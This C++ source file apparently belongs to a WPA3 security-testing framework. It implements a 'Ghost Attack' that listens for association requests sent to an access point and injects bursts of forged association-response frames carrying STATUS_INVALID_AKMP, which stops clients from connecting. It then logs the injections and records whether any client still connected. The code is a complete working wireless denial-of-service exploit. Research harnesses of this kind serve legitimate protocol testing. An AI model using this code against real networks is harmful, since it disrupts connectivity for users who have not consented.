#include "attacks/DoS_hard/no_connect/ghost_attack/ghost_attack.h"
#include "attacks/DoS_hard/no_connect/no_connect_helpers.h"

#include <linux/if_packet.h>
#include <sys/socket.h>
#include <tins/tins.h>

#include "attacks/components/setup_connections.h"
#include "logger/log.h"
#include "logger/log_util.h"
#include "net_parser/dot11_defs.h"
#include "net_parser/radiotap_defs.h"

using namespace std;
using namespace Tins;

namespace wpa3_tester::ghost_attack {

void setup_attack(RunStatus &rs) {
	components::setup_AP(rs, "ap");
}

static frame_raw_t build_reject_assoc_resp(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
	Dot11AssocResponse resp(sta_mac, ap_mac);
	resp.addr3(ap_mac);
	resp.capabilities().ess(true);
	resp.status_code(dot11::STATUS_INVALID_AKMP);
	resp.aid(0);
	RadioTap rt;
	rt.inner_pdu(resp);
	return rt.serialize();
}

void run_attack(RunStatus &rs) {
	const HWAddress<6> ap_mac = rs.get_actor("ap").get(SK::mac);
	const int burst_size      = rs.config().at("attack_config").at("burst_size").get<int>();
	int injections            = 0;

	no_connect::run_attack(rs,
		"wlan type mgt subtype assoc-req and wlan addr1 " + ap_mac.to_string(),
		"Ghost Attack: injecting fake AssocResp (STATUS_INVALID_AKMP)",
		[&](const frame_raw_t &frame, int fd, const sockaddr_ll &addr) -> optional<bool> {
			const uint16_t rt_len = radiotap::get_rt_len(frame);
			if(frame.size() < rt_len + 1) return nullopt;
			// guard against BPF compile failure delivering non-AssocReq frames
			const uint8_t fc0 = frame[rt_len + dot11::FC_OFFSET];
			if(((fc0 >> dot11::FC_TYPE_SHIFT) & dot11::FC_TYPE_MASK) != dot11::TYPE_MGMT) return nullopt;
			if(((fc0 >> dot11::FC_SUBTYPE_SHIFT) & dot11::FC_SUBTYPE_MASK) != dot11::MGMT_ASSOC_REQ) return nullopt;
			if(frame.size() < rt_len + dot11::ADDR2_END) return nullopt;
			const HWAddress<6> sta_mac(frame.data() + rt_len + dot11::ADDR2_OFFSET);
			const auto bytes = build_reject_assoc_resp(ap_mac, sta_mac);
			for(int i = 0; i < burst_size; ++i)
				sendto(fd, bytes.data(), bytes.size(), MSG_DONTWAIT,
					reinterpret_cast<const sockaddr *>(&addr), sizeof(addr));
			injections += burst_size;
			log(LogLevel::DEBUG, "Injected reject AssocResp x{} → {}", burst_size, sta_mac.to_string());
			return nullopt;
		});

	log(LogLevel::INFO, "Attack ended, {} AssocResp injections", injections);

	const bool client_connected = !get_time_logs(rs, "ap", "AP-STA-CONNECTED").empty();
	rs.save_result({{"client_connected", client_connected}});
}

void stats_attack(const RunStatus &rs) {
	no_connect::stats_attack(rs);
}
}
